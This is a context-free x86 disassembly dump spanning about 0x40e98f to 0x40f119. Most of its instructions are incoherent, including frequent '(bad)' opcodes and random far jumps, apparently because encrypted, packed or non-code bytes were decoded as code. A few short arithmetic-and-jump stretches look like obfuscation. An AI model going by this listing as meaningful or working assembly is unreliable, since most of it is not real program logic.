  40e98f:	stos   DWORD PTR es:[edi],eax
  40e990:	retf   
  40e991:	pop    ebp
  40e992:	push   ds
  40e993:	mov    cl,0x46
  40e995:	and    eax,0x5fa3d910
  40e99a:	sub    esp,DWORD PTR [edi]
  40e99c:	stc    
  40e99d:	stos   BYTE PTR es:[edi],al
  40e99e:	push   ecx
  40e99f:	das    
  40e9a0:	hlt    
  40e9a1:	imul   esi,DWORD PTR [esi],0x77
  40e9a4:	pop    esp
  40e9a5:	pushf  
  40e9a6:	ror    BYTE PTR [edx+0x4d89cd73],1
  40e9ac:	jns    0x40e9f3
  40e9ae:	sbb    edi,DWORD PTR [ebx]
  40e9b0:	scas   al,BYTE PTR es:[edi]
  40e9b1:	inc    esp
  40e9b2:	(bad)  
  40e9b3:	neg    DWORD PTR [ecx+0xc]
  40e9b6:	fbld   TBYTE PTR [ecx+eiz*8]
  40e9b9:	mov    ch,0xd3
  40e9bb:	stc    
  40e9bc:	xor    BYTE PTR [esi-0x23534c0],dh
  40e9c2:	imul   esi,DWORD PTR [eax-0x15],0x429af63c
  40e9c9:	aam    0xb4
  40e9cb:	or     DWORD PTR [ebx+0x4d88285e],eax
  40e9d1:	ret    0x23f0
  40e9d4:	xchg   BYTE PTR [eax+0x3f],ah
  40e9d7:	test   BYTE PTR ss:[esi],0xc8
  40e9db:	test   BYTE PTR [eax-0x52b7bae5],dh
  40e9e1:	or     dh,BYTE PTR [eax-0x28]
  40e9e4:	or     bl,0x11
  40e9e7:	(bad)  
  40e9e8:	(bad)  
  40e9e9:	xchg   ecx,eax
  40e9ea:	popa   
  40e9eb:	xor    al,0x99
  40e9ed:	retf   0x891f
  40e9f0:	jg     0x40e9a0
  40e9f2:	add    eax,0x110fb3ac
  40e9f7:	cld    
  40e9f8:	pop    esi
  40e9f9:	cmp    BYTE PTR [ebx+0x16],ch
  40e9fc:	test   DWORD PTR [edi+0xcec5fdf],0x7ef4b3f3
  40ea06:	cld    
  40ea07:	sbb    BYTE PTR [edx+0x5aaa9d1f],cl
  40ea0d:	inc    esp
  40ea0e:	push   ecx
  40ea0f:	adc    BYTE PTR [edi],al
  40ea11:	shl    BYTE PTR [edi],0x6f
  40ea14:	popa   
  40ea15:	ins    BYTE PTR es:[edi],dx
  40ea16:	adc    DWORD PTR [edx],ecx
  40ea18:	retf   
  40ea19:	jae    0x40e9ac
  40ea1b:	pop    es
  40ea1c:	sub    ch,al
  40ea1e:	xor    DWORD PTR [eax],esp
  40ea20:	dec    ebp
  40ea21:	adc    BYTE PTR [ebp-0x6c],dl
  40ea24:	les    ecx,FWORD PTR [eax+0x72]
  40ea27:	mov    dh,0xa0
  40ea29:	aaa    
  40ea2a:	cmp    eax,DWORD PTR [ebx-0x34196bfe]
  40ea30:	adc    al,0xa6
  40ea32:	dec    eax
  40ea33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea34:	mov    ch,0xc3
  40ea36:	(bad)  
  40ea37:	mov    al,0xd8
  40ea39:	pushf  
  40ea3a:	xor    DWORD PTR [eax+0x17b3e247],0xe20164d1
  40ea44:	xlat   BYTE PTR ds:[ebx]
  40ea45:	(bad)  
  40ea46:	out    dx,eax
  40ea47:	int    0x2e
  40ea49:	mov    al,BYTE PTR [eax]
  40ea4b:	push   cs
  40ea4c:	fsubrp st(5),st
  40ea4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea4f:	mov    bl,0x89
  40ea51:	sar    dl,cl
  40ea53:	mov    ch,0xa0
  40ea55:	mov    al,ds:0xd0638d49
  40ea5a:	iret   
  40ea5b:	leave  
  40ea5c:	inc    bp
  40ea5e:	scas   al,BYTE PTR es:[edi]
  40ea5f:	fsub   st(0),st
  40ea61:	lods   eax,DWORD PTR ds:[esi]
  40ea62:	jle    0x40ea65
  40ea64:	into   
  40ea65:	dec    esi
  40ea66:	adc    BYTE PTR [eax+0x67],bl
  40ea69:	ss mov dh,dl
  40ea6c:	inc    edi
  40ea6d:	xor    al,0x55
  40ea6f:	rol    DWORD PTR [ebp-0x5e],cl
  40ea72:	ds xor eax,0x1896d513
  40ea78:	sub    al,0x87
  40ea7a:	test   eax,0xd5ccffc8
  40ea7f:	sub    DWORD PTR [ebx+0x4a],esp
  40ea82:	and    DWORD PTR ds:0xcc1ac564,eax
  40ea88:	js     0x40ea27
  40ea8a:	add    BYTE PTR [ebx+0xe],dl
  40ea8d:	pusha  
  40ea8e:	pop    ebp
  40ea8f:	ror    BYTE PTR [ecx],1
  40ea91:	sub    eax,0xf206165a
  40ea96:	cmp    bh,BYTE PTR ds:[ebx+0x43]
  40ea9a:	icebp  
  40ea9b:	xor    edx,DWORD PTR [ebp-0x53]
  40ea9e:	and    esi,eax
  40eaa0:	addr16 jo 0x40ead6
  40eaa3:	shl    bh,cl
  40eaa5:	test   DWORD PTR [ebx+0x42256815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xa9aa14b9
  40eaf1:	and    BYTE PTR [edi-0x50],ch
  40eaf4:	std    
  40eaf5:	mov    eax,0x14d21818
  40eafa:	sbb    BYTE PTR [eax],bl
  40eafc:	cmp    DWORD PTR ds:0xf50a2f77,0x496787d3
  40eb06:	mov    WORD PTR [edi+0x6594b681],?
  40eb0c:	into   
  40eb0d:	pop    ebx
  40eb0e:	shr    BYTE PTR [ebp-0x2e],1
  40eb11:	ds mov edi,0xab19a078
  40eb17:	mov    DWORD PTR [edi+esi*4-0xc],0xec13f53f
  40eb1f:	jmp    0x40eb78
  40eb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb22:	les    ebp,FWORD PTR [ecx+ecx*4]
  40eb25:	mov    dh,0x5e
  40eb27:	pop    es
  40eb28:	pushf  
  40eb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb2a:	xor    DWORD PTR [edx-0x53f71bd8],ebx
  40eb30:	fidiv  WORD PTR [edx+0x5b]
  40eb33:	ins    BYTE PTR es:[edi],dx
  40eb34:	retf   0x82cf
  40eb37:	fimul  DWORD PTR [ebp+0x7a]
  40eb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb3b:	cwde   
  40eb3c:	aaa    
  40eb3d:	leave  
  40eb3e:	cmp    eax,0x98ce2e38
  40eb43:	and    BYTE PTR [ecx],dh
  40eb45:	test   al,0xaa
  40eb48:	sbb    DWORD PTR [edi],eax
  40eb4a:	retf   
  40eb4b:	inc    esi
  40eb4c:	or     dl,BYTE PTR [edx-0x20ae379]
  40eb52:	add    BYTE PTR [esi+0x19321ceb],al
  40eb58:	jge    0x40ebc3
  40eb5a:	inc    esp
  40eb5b:	cs ret 
  40eb5d:	popa   
  40eb5e:	ret    0x2df8
  40eb61:	jmp    0x3a946aa1
  40eb66:	int3   
  40eb67:	cmp    DWORD PTR [ecx+0x340aa624],esp
  40eb6d:	call   0x4e64:0xe1c3156c
  40eb74:	lea    ecx,[ebp-0x11ccf410]
  40eb7a:	xchg   ebp,eax
  40eb7b:	cs ret 
  40eb7d:	lea    edi,ds:0x12472820
  40eb83:	ret    
  40eb84:	cmp    DWORD PTR [edx],0x2f
  40eb87:	push   esi
  40eb88:	daa    
  40eb89:	xchg   BYTE PTR [esi],bh
  40eb8b:	xchg   edx,eax
  40eb8c:	rol    DWORD PTR [edi+0x6f],0x7b
  40eb90:	xor    eax,0xfd3c0f40
  40eb95:	cld    
  40eb96:	pop    ebx
  40eb97:	sbb    BYTE PTR [esi-0x80],cl
  40eb9a:	or     BYTE PTR [edi+0x37051aa4],bh
  40eba0:	rol    BYTE PTR [ecx+ecx*8+0x4c8ee94f],cl
  40eba7:	lds    esp,FWORD PTR ds:0x88f927b7
  40ebad:	or     BYTE PTR [ecx],ch
  40ebaf:	or     DWORD PTR [ebx+0x38],edx
  40ebb2:	scas   eax,DWORD PTR es:[edi]
  40ebb3:	push   eax
  40ebb4:	sbb    ch,BYTE PTR ds:0xff4c75f
  40ebba:	enter  0xedd2,0x4c
  40ebbe:	test   DWORD PTR [edi+0x189ec14a],ebp
  40ebc4:	pop    ebx
  40ebc5:	in     eax,0x72
  40ebc7:	ret    
  40ebc8:	inc    ebx
  40ebc9:	in     eax,dx
  40ebca:	in     eax,dx
  40ebcb:	jne    0x40ec3e
  40ebcd:	xchg   edx,eax
  40ebce:	push   ebp
  40ebcf:	pop    ss
  40ebd0:	lahf   
  40ebd1:	cwde   
  40ebd2:	pushf  
  40ebd3:	mov    cl,0x3e
  40ebd5:	inc    ebx
  40ebd6:	or     eax,0xf0bf801c
  40ebdb:	cmp    BYTE PTR [esi+ebp*4-0x33],dh
  40ebdf:	addr16 pop ebx
  40ebe1:	dec    edx
  40ebe2:	dec    eax
  40ebe3:	mov    esp,0x3d21df87
  40ebe8:	int3   
  40ebe9:	inc    ecx
  40ebea:	push   edi
  40ebeb:	idiv   BYTE PTR [edx+0x4e]
  40ebee:	call   0x5497fe0a
  40ebf3:	int3   
  40ebf4:	pop    ecx
  40ebf5:	push   esp
  40ebf6:	arpl   WORD PTR [edx+0x7e],sp
  40ebf9:	xor    DWORD PTR [esi],0x26
  40ebfc:	jmp    0x40ec59
  40ebfe:	test   bh,al
  40ec00:	jae    0x40ebd7
  40ec02:	scas   al,BYTE PTR es:[edi]
  40ec03:	xchg   ebp,eax
  40ec04:	stc    
  40ec05:	enter  0xa6e3,0xd5
  40ec09:	jge    0x40ec36
  40ec0b:	femms  
  40ec0d:	or     bh,BYTE PTR [ecx-0x1]
  40ec10:	sbb    DWORD PTR es:[ecx],esp
  40ec13:	ss es test al,0xa7
  40ec17:	mov    ebp,edi
  40ec19:	fldcw  WORD PTR [esi-0x31]
  40ec1c:	pop    ds
  40ec1d:	aas    
  40ec1e:	xor    al,0x8b
  40ec20:	jmp    0xdf22:0xfa29429a
  40ec27:	ss das 
  40ec29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec2a:	xorps  xmm6,XMMWORD PTR [edx*4+0x388902c2]
  40ec32:	cmp    al,0x80
  40ec34:	aas    
  40ec35:	pop    ss
  40ec36:	outs   dx,DWORD PTR ds:[esi]
  40ec37:	jg     0x40ec60
  40ec39:	mov    ah,0xf6
  40ec3b:	or     edi,eax
  40ec3d:	adc    BYTE PTR [ecx],dl
  40ec3f:	out    0x84,eax
  40ec41:	jle    0x40ec2e
  40ec43:	or     dl,BYTE PTR [ebx+0xa96abcb]
  40ec49:	push   cs
  40ec4a:	push   ds
  40ec4b:	and    eax,0x4a552e99
  40ec50:	add    BYTE PTR [ebx+0x3e1d25eb],0x23
  40ec57:	mov    edi,0x10e3453b
  40ec5c:	jmp    0xa831:0xbb42c8ce
  40ec63:	outs   dx,DWORD PTR ds:[esi]
  40ec64:	inc    esi
  40ec65:	outs   dx,DWORD PTR ds:[esi]
  40ec66:	lds    ecx,FWORD PTR [ecx-0x1c7cd67a]
  40ec6c:	fadd   DWORD PTR [esi]
  40ec6e:	cmp    edx,DWORD PTR [eax+edx*2+0x3ee7893a]
  40ec75:	outs   dx,DWORD PTR ds:[esi]
  40ec76:	cmp    eax,0xdd239332
  40ec7b:	jmp    0x322f:0x4022ccdc
  40ec82:	pop    ebx
  40ec83:	push   esi
  40ec84:	xor    eax,0x4d66a17b
  40ec89:	pop    es
  40ec8a:	data16 jle 0x40ecae
  40ec8d:	repz and al,0xf2
  40ec90:	sbb    ch,BYTE PTR [ebx]
  40ec92:	aad    0x32
  40ec94:	and    DWORD PTR [edi-0x52],edi
  40ec97:	xchg   ecx,eax
  40ec98:	(bad)  
  40ec99:	pop    edi
  40ec9a:	adc    BYTE PTR [edx],dl
  40ec9c:	xor    al,0xb8
  40ec9e:	inc    eax
  40ec9f:	pop    edx
  40eca0:	repz push eax
  40eca2:	push   ss
  40eca3:	cs push edx
  40eca5:	dec    edi
  40eca6:	mov    al,ds:0xab1daa2d
  40ecab:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40ecad:	xchg   ebx,eax
  40ecae:	sbb    ebp,DWORD PTR [edx]
  40ecb0:	into   
  40ecb1:	call   0x1405:0x3c093645
  40ecb8:	sub    eax,0x925ebeb8
  40ecbd:	mov    ebp,0xcdffceb3
  40ecc2:	repz (bad) 
  40ecc4:	xor    DWORD PTR [ebx],ecx
  40ecc6:	add    DWORD PTR [eax+0x57],0x3f
  40ecca:	or     esi,esi
  40eccc:	push   edx
  40eccd:	pop    edx
  40ecce:	(bad)  
  40eccf:	and    DWORD PTR [ebx-0x7aa06011],ecx
  40ecd5:	aaa    
  40ecd6:	xor    DWORD PTR [edx+0x2840cd10],edx
  40ecdc:	xchg   BYTE PTR [edx+eax*4-0x7609cb88],ah
  40ece3:	shr    ebx,cl
  40ece5:	ja     0x40ec85
  40ece7:	mov    ebx,0x13ea557f
  40ecec:	dec    esp
  40eced:	or     eax,0x1868425a
  40ecf2:	mov    eax,ds:0xf5d45aaf
  40ecf7:	adc    DWORD PTR [ebx+0x60da65a1],edi
  40ecfd:	cs rol cl,0x9c
  40ed01:	or     esi,DWORD PTR [ebx]
  40ed03:	ins    BYTE PTR es:[edi],dx
  40ed04:	xchg   esp,eax
  40ed05:	dec    eax
  40ed06:	lods   eax,DWORD PTR ds:[esi]
  40ed07:	inc    ebx
  40ed08:	fld    QWORD PTR [esi+ecx*2+0x17]
  40ed0c:	or     BYTE PTR ds:0x92815718,dh
  40ed12:	dec    edi
  40ed13:	aad    0xf0
  40ed15:	outs   dx,DWORD PTR ds:[esi]
  40ed16:	out    dx,al
  40ed17:	out    dx,eax
  40ed18:	lods   al,BYTE PTR ds:[esi]
  40ed19:	mov    cl,0x6b
  40ed1b:	push   edi
  40ed1c:	mov    esp,0x8b0ec0ce
  40ed21:	and    al,0xc1
  40ed23:	or     al,bh
  40ed25:	(bad)  
  40ed26:	loope  0x40ed62
  40ed28:	sar    DWORD PTR gs:[edi-0x14],0xf3
  40ed2d:	mul    esi
  40ed2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed30:	cmp    DWORD PTR [eax],0x75
  40ed33:	inc    ebp
  40ed34:	pop    ebp
  40ed35:	test   BYTE PTR [edx+eax*1+0x12],ch
  40ed39:	sbb    cl,BYTE PTR [eax+0x2]
  40ed3c:	mov    ax,0x3fcc
  40ed40:	rol    DWORD PTR [ecx-0x7d],1
  40ed43:	cmp    BYTE PTR [edi+0x1dddc2ef],dl
  40ed49:	gs call 0x4ed5:0x35aabaa1
  40ed51:	shl    ebp,cl
  40ed53:	enter  0xe92e,0x4f
  40ed57:	add    bl,bh
  40ed59:	lahf   
  40ed5a:	push   ds
  40ed5b:	call   0x61e8:0x10f93225
  40ed62:	or     eax,0xd831ede2
  40ed67:	dec    eax
  40ed68:	jg     0x40ed61
  40ed6a:	push   esi
  40ed6b:	loop   0x40ed8e
  40ed6d:	fdiv   DWORD PTR [ecx]
  40ed6f:	fild   DWORD PTR [ebx-0x7c]
  40ed72:	pop    ebx
  40ed73:	mov    ebx,0x1e52d6a9
  40ed78:	pop    es
  40ed79:	mov    BYTE PTR ds:0x4b36f9f6,dh
  40ed7f:	or     edi,esp
  40ed81:	or     eax,ebx
  40ed83:	bound  edi,QWORD PTR [edx]
  40ed85:	inc    ecx
  40ed86:	test   DWORD PTR [ecx+0x724a2343],esi
  40ed8c:	jnp    0x40ed1a
  40ed8e:	jecxz  0x40eda6
  40ed90:	hlt    
  40ed91:	test   al,0x99
  40ed93:	or     eax,0x66dd7a4c
  40ed98:	in     eax,0xfc
  40ed9a:	adc    al,0x82
  40ed9c:	sbb    al,0xdf
  40ed9e:	mov    esi,DWORD PTR [ecx+ebp*8]
  40eda1:	add    DWORD PTR [ecx],edi
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x27aa1270]
  40edd3:	push   eax
  40edd4:	popa   
  40edd5:	jo     0x40ed8e
  40edd7:	mov    dl,0x18
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    BYTE PTR [edi+0x172e2ffa],al
  40ede3:	sub    DWORD PTR [edi+0x4661b64c],esi
  40ede9:	das    
  40edea:	mov    bh,0x77
  40edec:	push   ebp
  40eded:	fsubr  DWORD PTR [edi-0x47]
  40edf0:	retf   0x47b1
  40edf3:	loope  0x40ed83
  40edf5:	adc    al,BYTE PTR [edi+0x20c21882]
  40edfb:	in     al,dx
  40edfc:	sbb    al,0xf8
  40edfe:	add    al,0xb3
  40ee00:	stc    
  40ee01:	mov    esi,0x4ac0c660
  40ee06:	push   ds
  40ee07:	int3   
  40ee08:	inc    ecx
  40ee09:	daa    
  40ee0a:	pop    ds
  40ee0b:	mov    cl,0xa2
  40ee0d:	xchg   esi,eax
  40ee0e:	pop    esi
  40ee0f:	mov    eax,ds:0xc18c76d
  40ee14:	pushf  
  40ee15:	rcr    BYTE PTR [ecx+ebx*8],cl
  40ee18:	dec    edi
  40ee19:	jmp    FWORD PTR ds:0xb5f85c52
  40ee1f:	and    eax,0xb14a13ac
  40ee24:	retf   
  40ee25:	sbb    ecx,ebx
  40ee27:	dec    esi
  40ee28:	jmp    0x70e9:0x27b8842e
  40ee2f:	add    bl,BYTE PTR [ebx-0x9]
  40ee32:	test   DWORD PTR [esi-0xe600beb],0x715c3dcf
  40ee3c:	jbe    0x40ede4
  40ee3e:	push   ss
  40ee3f:	nop
  40ee40:	lods   eax,DWORD PTR ds:[esi]
  40ee41:	pop    es
  40ee42:	loop   0x40ee4f
  40ee44:	mov    esp,0xdbafbc02
  40ee49:	js     0x40ee4f
  40ee4b:	sbb    al,0x41
  40ee4d:	inc    esi
  40ee4e:	mov    ecx,0x975c90c
  40ee53:	rcl    ah,cl
  40ee55:	in     al,dx
  40ee56:	inc    edi
  40ee57:	xor    eax,0xe8a853aa
  40ee5c:	jmp    0x7f3d:0x7ca43a62
  40ee63:	lds    ecx,FWORD PTR [ecx+0x7d655389]
  40ee69:	je     0x40ee2d
  40ee6b:	in     al,0x33
  40ee6d:	adc    al,0x45
  40ee6f:	inc    ecx
  40ee70:	mov    ch,0xdd
  40ee72:	aam    0xe3
  40ee74:	call   0x2dcb:0x14eec8de
  40ee7b:	xchg   DWORD PTR [eax-0x26c0da3],esp
  40ee81:	sbb    DWORD PTR [ebp-0x83906f9],esi
  40ee87:	sub    eax,0x2508aeb9
  40ee8c:	mov    BYTE PTR [edi],dl
  40ee8e:	aaa    
  40ee8f:	iret   
  40ee90:	gs and eax,0x67e845b3
  40ee96:	push   0xffffffbc
  40ee98:	xchg   esi,eax
  40ee99:	mov    ds:0xed5fd41c,eax
  40ee9e:	rol    DWORD PTR [edx],cl
  40eea0:	test   DWORD PTR [edx],0x962e2945
  40eea6:	iret   
  40eea7:	(bad)  
  40eea8:	xchg   ebx,eax
  40eea9:	and    dh,BYTE PTR [esi]
  40eeab:	cmp    bh,BYTE PTR [ecx-0x51]
  40eeae:	and    esi,DWORD PTR [edi-0x5]
  40eeb1:	mov    ds:0xa8ed39fb,eax
  40eeb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeb7:	repnz dec ecx
  40eeb9:	add    ah,BYTE PTR [esi]
  40eebb:	and    BYTE PTR [ebp-0x13],bh
  40eebe:	lods   al,BYTE PTR ds:[esi]
  40eebf:	es cmc 
  40eec1:	inc    ecx
  40eec2:	inc    eax
  40eec3:	retf   
  40eec4:	jl     0x40ee69
  40eec6:	ret    0x6932
  40eec9:	push   ecx
  40eeca:	dec    ecx
  40eecb:	pop    es
  40eecc:	jmp    0x40eeb9
  40eece:	or     dh,BYTE PTR [eax+0x3cd05e2b]
  40eed4:	cwde   
  40eed5:	icebp  
  40eed6:	(bad)  
  40eed7:	sub    ch,BYTE PTR [ecx+0x57]
  40eeda:	and    dl,dh
  40eedc:	jmp    0x3939:0xe7c3a73a
  40eee3:	std    
  40eee4:	aam    0xe5
  40eee6:	push   eax
  40eee7:	xchg   edi,eax
  40eee8:	sub    al,0xdf
  40eeea:	(bad)  
  40eeec:	cmp    esi,esp
  40eeee:	(bad)  
  40eeef:	addr16 add eax,0xf81e1368
  40eef5:	aaa    
  40eef6:	inc    edx
  40eef7:	sub    dh,bl
  40eef9:	retf   
  40eefa:	imul   edx,DWORD PTR [ebx],0xfffffffd
  40eefd:	xchg   esp,eax
  40eefe:	pop    edx
  40eeff:	imul   esp,DWORD PTR [ebx],0x49
  40ef02:	in     eax,dx
  40ef03:	out    dx,eax
  40ef04:	loop   0x40ef02
  40ef06:	xchg   esp,ecx
  40ef08:	and    eax,0x91f352cd
  40ef0d:	push   edi
  40ef0e:	repz xlat BYTE PTR ds:[ebx]
  40ef10:	call   0x6ff6635a
  40ef15:	jns    0x40eeba
  40ef17:	stos   DWORD PTR es:[edi],eax
  40ef18:	repz adc edx,DWORD PTR [esi-0x3d12867]
  40ef1f:	dec    ebp
  40ef20:	pop    esi
  40ef21:	pusha  
  40ef22:	lds    edx,FWORD PTR [eax+edx*2]
  40ef25:	in     eax,0xe3
  40ef27:	add    DWORD PTR [esp+ecx*1+0x404789f6],ebx
  40ef2e:	xlat   BYTE PTR ds:[ebx]
  40ef2f:	rcl    BYTE PTR [ecx+esi*8+0x1],1
  40ef33:	pavgb  mm3,QWORD PTR [edx]
  40ef36:	add    al,0x20
  40ef38:	add    eax,0xbc3f0a97
  40ef3d:	loopne 0x40eec1
  40ef3f:	inc    eax
  40ef40:	mov    esp,0x741371a9
  40ef45:	mov    ah,0xb2
  40ef47:	fild   WORD PTR [eax+0x30bbf10a]
  40ef4d:	push   edi
  40ef4e:	aas    
  40ef4f:	out    dx,al
  40ef50:	out    dx,al
  40ef51:	sar    DWORD PTR [ecx],cl
  40ef53:	sub    BYTE PTR [esi],ah
  40ef55:	cmp    bh,BYTE PTR [ecx-0x53]
  40ef58:	shl    BYTE PTR [eax-0x36364119],1
  40ef5e:	jo     0x40eeef
  40ef60:	pop    eax
  40ef61:	inc    esi
  40ef62:	fucomi st,st(2)
  40ef64:	scas   al,BYTE PTR es:[edi]
  40ef65:	push   0x6ba3d3be
  40ef6a:	sbb    al,0x9
  40ef6c:	call   0xcc63b56d
  40ef71:	jb     0x40efae
  40ef73:	mov    al,0x48
  40ef75:	dec    esi
  40ef76:	push   esp
  40ef77:	jp     0x40ef3a
  40ef79:	inc    edi
  40ef7a:	and    eax,0xb8f35408
  40ef7f:	ret    0x67f7
  40ef82:	loope  0x40ef70
  40ef84:	or     BYTE PTR [ebp-0x56],dh
  40ef87:	ins    BYTE PTR es:[edi],dx
  40ef88:	push   es
  40ef89:	and    DWORD PTR [esi],0xffffffae
  40ef8c:	jb     0x40ef98
  40ef8e:	outs   dx,DWORD PTR ds:[esi]
  40ef8f:	sbb    BYTE PTR [edi+0x19],cl
  40ef92:	sahf   
  40ef93:	push   edx
  40ef94:	arpl   WORD PTR [edx-0x64e32f8b],di
  40ef9a:	out    dx,al
  40ef9b:	dec    esi
  40ef9c:	mov    ch,0xf8
  40ef9e:	pop    esi
  40ef9f:	jl     0x40f01b
  40efa1:	jnp    0x40ef89
  40efa3:	jno    0x40ef47
  40efa5:	iret   
  40efa6:	les    esp,FWORD PTR [ebp+0x1d9349]
  40efac:	fsub   DWORD PTR [edi]
  40efae:	xchg   ebp,eax
  40efaf:	sub    eax,0x36927415
  40efb4:	inc    ecx
  40efb5:	sub    BYTE PTR [eax],0x40
  40efb8:	xor    DWORD PTR [esi+edx*4-0x9a26ce],edi
  40efbf:	inc    ebx
  40efc0:	sahf   
  40efc1:	dec    esi
  40efc2:	dec    ecx
  40efc3:	push   ebx
  40efc4:	and    BYTE PTR [ebx+0x59ef0345],al
  40efca:	sub    dh,BYTE PTR [ebx+0x50d0451e]
  40efd0:	or     eax,0xffbab1dd
  40efd5:	(bad)  
  40efd6:	fcmovnb st,st(2)
  40efd8:	leave  
  40efd9:	test   al,0x41
  40efdb:	jns    0x40efe7
  40efdd:	ret    
  40efde:	adc    eax,0xb795d2e9
  40efe3:	nop
  40efe4:	jge    0x40efc1
  40efe6:	sbb    DWORD PTR [eax],edi
  40efe8:	mov    eax,0x54022f61
  40efed:	gs (bad) 
  40eff0:	jmp    0x40effd
  40eff2:	xor    dl,BYTE PTR [edi+0x6f]
  40eff5:	sbb    ch,dh
  40eff7:	push   ebp
  40eff8:	cmp    esi,DWORD PTR [edx-0x4f2988b3]
  40effe:	into   
  40efff:	or     al,0xce
  40f001:	aas    
  40f002:	imul   eax,DWORD PTR [ecx+edi*2],0x57
  40f006:	js     0x40f072
  40f008:	addr16 popa 
  40f00a:	retf   0x85f6
  40f00d:	add    BYTE PTR [ebp+0x2d1cce6a],dh
  40f013:	push   esi
  40f014:	(bad)  
  40f015:	stc    
  40f016:	retf   0xe16b
  40f019:	jge    0x40f06c
  40f01b:	or     esi,DWORD PTR [edx-0x42]
  40f01e:	xor    DWORD PTR [ebx-0x258f4477],esi
  40f024:	add    al,0x47
  40f026:	push   0x37351b29
  40f02b:	arpl   WORD PTR [ebx-0x76],cx
  40f02e:	ds xchg ecx,eax
  40f030:	ja     0x40f075
  40f032:	dec    ebx
  40f033:	(bad)
  40f037:	aam    0xbd
  40f039:	or     eax,0x28617836
  40f03e:	(bad)  
  40f03f:	xlat   BYTE PTR ds:[ebx]
  40f040:	pushf  
  40f041:	in     al,0x4
  40f043:	mov    dh,0xc
  40f045:	addr16 clc 
  40f047:	pop    esp
  40f048:	pop    ds
  40f049:	cmp    al,0x5f
  40f04b:	call   DWORD PTR [edx+edi*4-0x54]
  40f04f:	aas    
  40f050:	and    DWORD PTR ds:0xb4e731c4,0xabf6f6e2
  40f05a:	push   edx
  40f05b:	dec    ebx
  40f05c:	loop   0x40f027
  40f05e:	sar    DWORD PTR [esi+esi*2+0x26c9de1f],0x84
  40f066:	fmul   QWORD PTR [esi-0x5b]
  40f069:	xor    eax,0x8a71f0b5
  40f06e:	mov    esi,DWORD PTR ds:0xdc9799fd
  40f074:	mov    esp,0xd2a906b2
  40f079:	fsubr  DWORD PTR [eax+0x71]
  40f07c:	lods   al,BYTE PTR ds:[esi]
  40f07d:	dec    edx
  40f07e:	leave  
  40f07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f080:	(bad)  [edi]
  40f082:	mov    ebp,0x850f3260
  40f087:	or     bh,dh
  40f089:	(bad)  
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xccfa:0xaa146552
  40f09f:	imul   BYTE PTR [edx+0x70]
  40f0a2:	scas   al,BYTE PTR es:[edi]
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    bh,dh
  40f0aa:	or     al,0x99
  40f0ac:	sub    ch,al
  40f0ae:	xchg   ecx,eax
  40f0af:	into   
  40f0b0:	daa    
  40f0b1:	loopne 0x40f094
  40f0b3:	imul   edx,ebp,0x31807e45
  40f0b9:	cdq    
  40f0ba:	add    BYTE PTR ds:0x5fb8b4e5,ch
  40f0c0:	mov    ?,WORD PTR [ebx+0x7d]
  40f0c3:	fmul   st(1),st
  40f0c5:	ja     0x40f107
  40f0c7:	sub    eax,DWORD PTR [edi]
  40f0c9:	into   
  40f0ca:	xor    ecx,edx
  40f0cc:	add    BYTE PTR [ebp+0x7d],bh
  40f0cf:	cmp    BYTE PTR [edx+0x20],cl
  40f0d2:	pusha  
  40f0d3:	es pop ds
  40f0d5:	(bad)  
  40f0d6:	pop    esi
  40f0d7:	jb     0x40f10c
  40f0d9:	mov    ch,0xbb
  40f0db:	hlt    
  40f0dc:	call   DWORD PTR [edi]
  40f0de:	stc    
  40f0df:	xor    ecx,ebp
  40f0e1:	leave  
  40f0e2:	push   ecx
  40f0e3:	xor    eax,0xa4cfc3a9
  40f0e8:	ror    DWORD PTR [ebx-0x39],0xbd
  40f0ec:	or     BYTE PTR ds:0xdd0e52b7,ah
  40f0f2:	and    al,0xa9
  40f0f4:	mov    ebx,0x9e97f707
  40f0f9:	daa    
  40f0fa:	sub    DWORD PTR [esi],0xffffffc8
  40f0fd:	mov    ds:0xde575795,al
  40f102:	and    ah,ch
  40f104:	jmp    0xae64:0x3dc632b2
  40f10b:	gs push ebx
  40f10d:	ins    DWORD PTR es:[edi],dx
  40f10e:	out    0xdd,eax
  40f110:	add    ebx,esi
  40f112:	call   FWORD PTR [ebp+ebp*1+0x2f33a5ac]
  40f119:	aam    0x3b
